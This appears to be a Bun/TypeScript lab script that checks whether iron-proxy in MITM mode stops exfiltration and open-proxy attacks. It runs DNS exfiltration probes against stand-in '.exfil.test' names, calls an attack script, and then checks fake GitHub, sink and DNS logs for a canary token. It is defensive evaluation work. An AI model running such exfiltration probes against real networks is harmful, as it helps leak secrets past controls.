// iron-proxy 0.61.0 in MITM mode as the A comparator: only the attacks that differ for MITM
// (open proxy via CONNECT / SNI / Host, E1 body truncation, E3 DNS), plus the echo leak and U8.
import { copyFileSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'

import { canaryGh, here, inKurumi, logsSince, newToken, outDir, sessionDirs, show } from './lab.ts'

const IRON = '10.251.11.50'
const dirs = sessionDirs()
copyFileSync(join(here, 'out', 'pki', 'iron-ca.crt'), join(dirs.workspaceDir, '.attack', 'iron-ca.crt'))
const tag = crypto.randomUUID().slice(0, 6)
const since = new Date(Date.now() - 2000).toISOString()

const dns = [
  `echo "resolv.conf: $(grep nameserver /etc/resolv.conf | tr '\\n' ' ')"`,
  `bun /work/.attack/dnsq.ts 127.0.0.11 api.github.test`,
  `bun /work/.attack/dnsq.ts 127.0.0.11 e3a-${tag}.exfil.test`,
  `bun /work/.attack/dnsq.ts ${IRON} e3b-${tag}.exfil.test`,
  `bun /work/.attack/dnsq.ts ${IRON} e3c-${tag}.pass.test`,
  `echo "getent api.github.test: $(getent hosts api.github.test || echo FAIL)"`,
].join('; ')
// The per-turn token is unused here: standalone iron-proxy has one static proxy token in its YAML.
const r = await inKurumi('kh1-ag', newToken(), `${dns}; bun /work/.attack/attack-iron.ts ${IRON} /work/.attack/iron-ca.crt`, dirs, ['--dns', IRON])
show('container output (DNS probes, then one JSON line per probe)', r.stdout + (r.stderr ? `\nstderr: ${r.stderr}` : ''))

await Bun.sleep(500)
const gh = (await logsSince('kh1-gh', since)).split('\n').filter((l) => l.startsWith('{'))
show(
  'fake GitHub log lines for the iron probes (method path auth bodyLen bodyTail)',
  gh
    .filter((l) => /probe=(I|E1)/.test(l))
    .map((l) => {
      const j = JSON.parse(l)
      const a = String(j.headers.authorization ?? '-')
      return `${j.method} ${new URL(j.url).pathname}${new URL(j.url).search} auth=${a.includes(canaryGh) ? 'Bearer <CANARY_GH>' : a} bodyLen=${j.bodyLen} bodyTail=${String(j.bodyTail).replaceAll(canaryGh, '<CANARY_GH>')}`
    }),
)
show('sink log (should be empty)', (await logsSince('kh1-sink', since)).split('\n').filter((l) => l.startsWith('{')).join('\n') || '(empty)')
show(`fake authoritative DNS log lines containing ${tag}`, (await logsSince('kh1-dns', since)).split('\n').filter((l) => l.includes(tag)).join('\n') || '(none)')
show('iron-proxy log (audit records)', (await logsSince('kh1-iron', since)).split('\n').filter((l) => l.includes('"host"') || l.includes('request')).map((l) => l.replaceAll(canaryGh, '<CANARY_GH>').slice(0, 600)).join('\n'))
writeFileSync(join(outDir, 'iron.json'), JSON.stringify(r.stdout.split('\n').filter((l) => l.startsWith('{')).map((l) => JSON.parse(l)), null, 2))
process.exit(0)
